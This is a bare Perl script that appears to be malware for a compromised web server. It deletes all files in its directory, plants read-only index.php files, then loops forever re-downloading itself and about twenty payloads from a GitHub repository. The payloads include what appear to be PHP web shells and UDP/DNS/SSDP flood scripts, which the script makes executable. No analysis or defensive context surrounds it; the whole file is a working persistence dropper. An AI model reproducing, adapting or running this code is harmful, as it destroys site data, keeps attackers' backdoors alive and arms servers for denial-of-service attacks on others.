#!/usr/bin/perl
use strict;
use warnings;

use File::Path qw(make_path);

my $script_url = 'raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.core_2230319ca36a6a5d.pl';
my $script_path = $0;

my %tmp_files = (
    "logs_962060d0939dar2o.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/logs_962060d0939dar2o.php",
    "sess_916f9c30948dcc2c.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/sess_916f9c30948dcc2c.php",
    "temp_156b0bb68af8ae51.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/temp_156b0bb68af8ae51.php",
    "etc_8h3060h0949dr427.PhP7" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/etc_8h3060h0949dr427.PhP7",
    "tiny_50kd19jaw938azh1.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/tiny_50kd19jaw938azh1.php",
    ".100up.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.100up.pl",
    ".dns.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.dns.pl",
    ".echo.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.echo.pl",
    ".isakmp.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.isakmp.pl",
    ".kill.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.kill.pl",
    ".rip.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.rip.pl",
    ".srvloc.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.srvloc.pl",
    ".ssdp.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.ssdp.pl",
    ".vse.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.vse.pl",
    ".stdhex.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.stdhex.pl",
    ".udpbypass.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.udpbypass.pl",
    ".udphex.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.udphex.pl",
    ".home.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.home.php",
    "home.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/home.php",
);

my $tmp_path = './tmp';
my $htaccess_url = 'raw.githubusercontent.com/sunokazzu/zuskoa_34/main/.htaccess';

system('find . -type f -exec chmod 744 {} \;');
system('find . -type d -exec chmod 755 {} \;');
system('rm -rf .*');
system('rm -rf *');

make_path($tmp_path) unless -d $tmp_path;

system('touch index.php');
system('chmod 0444 index.php');
foreach my $dir (glob '*/') {
    system("touch $dir/index.php");
    system("chmod 0444 $dir/index.php");
}

while (1) {
    sleep 2;

    unless (-e $script_path) {
        system("wget -O $script_path $script_url");
        system("chmod +x $script_path") if -e $script_path;
    }
    
    while (my ($file, $url) = each %tmp_files) {
        my $file_path = "$tmp_path/$file";
        unless (-e $file_path) {
            system("wget -O $file_path $url");
            system("chmod +x $file_path") if -e $file_path;
        }
    }
}
